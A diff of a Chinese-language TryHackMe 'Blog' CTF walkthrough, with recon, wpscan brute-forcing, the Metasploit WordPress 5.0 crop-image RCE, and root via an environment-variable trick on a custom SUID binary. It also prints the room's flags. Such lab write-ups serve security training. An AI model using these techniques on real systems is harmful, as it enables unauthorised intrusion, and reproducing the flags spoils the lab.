@@ -1,10 +1,10 @@
-#绑定域名
-echo "10.10.122.108 blog.thm" >>/etc/hosts
+# 绑定域名
+```echo "10.10.122.108 blog.thm" >>/etc/hosts```
 
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme]
-└─# nmap -sV -Pn 10.10.122.108                          
+└─#  nmap -sV -Pn 10.10.122.108                          
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-17 06:05 EDT
 Nmap scan report for 10.10.122.108
@@ -23,10 +23,10 @@ Nmap done: 1 IP address (1 host up) scanned in 41.55 seconds
 
 
 
-#看首页应该是一个wordpress站点，wpscan枚举这个站点信息,确认wp版本5.0
+# 看首页应该是一个wordpress站点，wpscan枚举这个站点信息,确认wp版本5.0
 ```
 ┌──(root💀kali)-[~/tryhackme]
-└─# wpscan --url http://10.10.122.108       
+└─#  wpscan --url http://10.10.122.108       
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -113,10 +113,10 @@ Interesting Finding(s):
 
 ```
 
-#wordpress 5.0版本存在一个远程执行漏洞
+# wordpress 5.0版本存在一个远程执行漏洞
 ```
 ──(root💀kali)-[~]
-└─# searchsploit wordpress 5.0
+└─#  searchsploit wordpress 5.0
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                                                            |  Path
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -127,10 +127,10 @@ WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)                     
 
 看exp需要账号和密码，那么现在需要做的是确定账号和密码是什么
 
-#枚举wp用户名
+# 枚举wp用户名
 ```
 ┌──(root💀kali)-[~]
-└─# wpscan --url http://10.10.122.108 --enumerate u1-1000 
+└─#  wpscan --url http://10.10.122.108 --enumerate u1-1000 
 
 [+] Enumerating Users (via Passive and Aggressive Methods)
  Brute Forcing Author IDs - Time: 00:01:08 <==========================================================================================================================================================> (1000 / 1000) 100.00% Time: 00:01:08
@@ -166,12 +166,12 @@ WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)                     
 
 经验证，```bjoel```和```kwheel```是真实存在的用户名。
 
-#尝试爆破bjoel的wp账号,好像爆不出来
+# 尝试爆破bjoel的wp账号,好像爆不出来
 
 wpscan --url http://10.10.122.108 --usernames bjoel --passwords /usr/share/wordlists/rockyou.txt 
 
 
-#尝试渗透445端口samba服务
+# 尝试渗透445端口samba服务
 ```
 enum4linux 10.10.122.108                                                                                                                                                                                                           255 ⨯
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Sep 17 06:31:36 2021
@@ -263,10 +263,10 @@ NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 
 ```
 
-#//10.10.122.108/BillySMB 是可以不用密码就可以访问的
+# //10.10.122.108/BillySMB 是可以不用密码就可以访问的
 ```
 ┌──(root💀kali)-[~/tryhackme/blog]
-└─# smbclient  //10.10.122.108/BillySMB
+└─#  smbclient  //10.10.122.108/BillySMB
 Enter WORKGROUP\root's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -290,7 +290,7 @@ check-this.png 下载到本地，发现是一张二维码，解密出来是一�
 https://www.youtube.com/watch?v=eFTLKWw542g
 ```
 视频标签
-#BillyJoel#WeDidntStartTheFire#Rock
+# BillyJoel# WeDidntStartTheFire# Rock
 
 把这个url,标签，标题拆分成几种形式都不能登录wp后台
 
@@ -306,26 +306,26 @@ I Knew You Were Trouble是一首流行歌曲，表达了一种我明知道你是
 所以以上这些跟登录密码有什么关系？
 
 
-#我们使用steghide（Steghide是一个可以将文件隐藏到图片或音频中的工具,析出文件用extract参数）查看文件
+# 我们使用steghide（Steghide是一个可以将文件隐藏到图片或音频中的工具,析出文件用extract参数）查看文件
 ```
 ┌──(root💀kali)-[~/tryhackme/blog]
-└─# steghide extract -sf Alice-White-Rabbit.jpg 
+└─#  steghide extract -sf Alice-White-Rabbit.jpg 
 Enter passphrase: 
 wrote extracted data to "rabbit_hole.txt".
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/blog]
-└─# ls
+└─#  ls
 Alice-White-Rabbit.jpg  check-this.png  rabbit_hole.txt  smb.txt  tswift.mp4
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/blog]
-└─# cat rabbit_hole.txt 
+└─#  cat rabbit_hole.txt 
 You've found yourself in a rabbit hole, friend.
 
 ```
 
 所以整个samba服务就是一个兔子洞
 
-#尝试爆破kwheel的用户名
+# 尝试爆破kwheel的用户名
 ```
 wpscan --url http://10.10.122.108 --usernames kwheel --passwords /usr/share/wordlists/rockyou.txt 
 
@@ -357,7 +357,7 @@ msf6 exploit(multi/http/wp_crop_rce) > run
 
 ```
 
-#user flag不在home目录
+# user flag不在home目录
 ```
 $ cat /home/bjoel/user.txt
 cat /home/bjoel/user.txt
@@ -366,10 +366,10 @@ You won't find what you're looking for here.
 TRY HARDER
 ```
 
-#传linpeas枚举漏洞，查看可利用的SUID
+# 传linpeas枚举漏洞，查看可利用的SUID
 ```
 ══════════╣ SUID - Check easy privesc, exploits and write perms                                                                                                                                                                            
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                 
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation# sudo-and-suid                                                                                                                                                                 
 -rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                      
 -rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
 -rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
@@ -421,17 +421,17 @@ TRY HARDER
 
 ```
 
-#留意这一行
+# 留意这一行
 ```-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker (Unknown SUID binary)```
 
-#执行这个命令，一直返回Not an Admin
+# 执行这个命令，一直返回Not an Admin
 ```
 $ checker
 checker
 Not an Admin
 ```
 
-#用ltrace跟踪函数调用情况
+# 用ltrace跟踪函数调用情况
 ```
 $ ltrace checker
 ltrace checker
@@ -445,7 +445,7 @@ puts("Not an Admin"Not an Admin
 
 我们手动把admin的值变为1
 
-#再次跟踪，发现流程已经导/bin/bash
+# 再次跟踪，发现流程已经导/bin/bash
 ```
 $ export admin=1
 export admin=1
@@ -457,17 +457,17 @@ system("/bin/bash"www-data@blog:/home/bjoel$
 ```
 
 
-#执行checker，成功提权到root，拿到root.txt和user.txt
+# 执行checker，成功提权到root，拿到root.txt和user.txt
 ```
 www-data@blog:/home/bjoel$ checker
 checker
-root@blog:/home/bjoel# id
+root@blog:/home/bjoel#  id
 id
 uid=0(root) gid=33(www-data) groups=33(www-data)
-root@blog:/home/bjoel# cat /root/root.txt
+root@blog:/home/bjoel#  cat /root/root.txt
 cat /root/root.txt
 9a0b2b618bef9bfa7ac28c1353d9f318
-root@blog:/home/bjoel# find / -name user.txt
+root@blog:/home/bjoel#  find / -name user.txt
 find / -name user.txt
 /home/bjoel/user.txt
 /media/usb/user.txt
@@ -477,7 +477,7 @@ find: '/proc/2245/task/2245/net': Invalid argument
 find: '/proc/2245/net': Invalid argument
 find: '/proc/3237/task/3237/net': Invalid argument
 find: '/proc/3237/net': Invalid argument
-root@blog:/home/bjoel# cat /media/usb/user.txt
+root@blog:/home/bjoel#  cat /media/usb/user.txt
 cat /media/usb/user.txt
 c8421899aae571f7af486492b71a8ab7
 ```
